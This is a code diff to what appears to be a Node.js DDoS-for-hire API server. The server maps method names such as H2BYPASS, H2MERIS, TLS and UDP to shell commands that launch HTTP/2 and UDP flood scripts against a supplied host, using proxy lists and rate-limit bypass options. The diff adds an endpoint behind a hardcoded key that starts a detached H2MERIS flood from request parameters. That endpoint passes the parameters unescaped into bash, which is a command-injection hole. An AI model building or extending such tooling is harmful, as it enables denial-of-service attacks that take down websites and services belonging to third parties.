@@ -6,7 +6,7 @@ const port = 2216;
 const methods = {
     H2FLASH: 'H2-FLASH.js',
     H2NEYLI: 'H2-NEYLI.js',
-    BROWSER: 'browsern.js', 
+    BROWSER: 'browsern.js',
     H2BYPASS: 'H2-BYPASS.js',
     RAW: 'Raw.js',
     TLS: 'tls.js',
@@ -35,7 +35,7 @@ const generateCommand = (method, host, port, time) => {
             return `cd /root/methods && node Raw.js ${host} ${time}`;
         case 'H2BYPASS':
             return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 8 proxy.txt`;
-        case 'H2-MERIS':
+        case 'H2MERIS':
             return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
         case 'UDP':
             return `cd /root/.trash && gcc udp.c -o udp && ./udp ${host} ${port} ${time}`;
@@ -82,6 +82,45 @@ app.get('/api', (req, res) => {
 
     process.on('close', (code) => {
         console.log(`Process exited with code ${code}`);
+    });
+
+    activeProcesses.set(process.pid, process);
+});
+
+// Endpoint tambahan khusus untuk menjalankan H2MERIS
+app.get('/api/h2meris', (req, res) => {
+    const key = req.query.key;
+    const host = req.query.host;
+    const time = req.query.time;
+
+    if (key !== 'leance') {
+        return res.status(401).json({ error: 'Invalid key' });
+    }
+
+    if (!host || !time) {
+        return res.status(400).json({ error: 'Missing host or time parameter' });
+    }
+
+    res.json({
+        status: 'H2MERIS attack initiated',
+        host: host,
+        time: time
+    });
+
+    const command = generateCommand('H2MERIS', host, undefined, time);
+    console.log(`Executing command: ${command}`);
+    const process = spawn('bash', ['-c', command], { detached: true });
+
+    process.stdout.on('data', (data) => {
+        console.log(`H2MERIS Stdout: ${data}`);
+    });
+
+    process.stderr.on('data', (data) => {
+        console.error(`H2MERIS Stderr: ${data}`);
+    });
+
+    process.on('close', (code) => {
+        console.log(`H2MERIS Process exited with code ${code}`);
     });
 
     activeProcesses.set(process.pid, process);
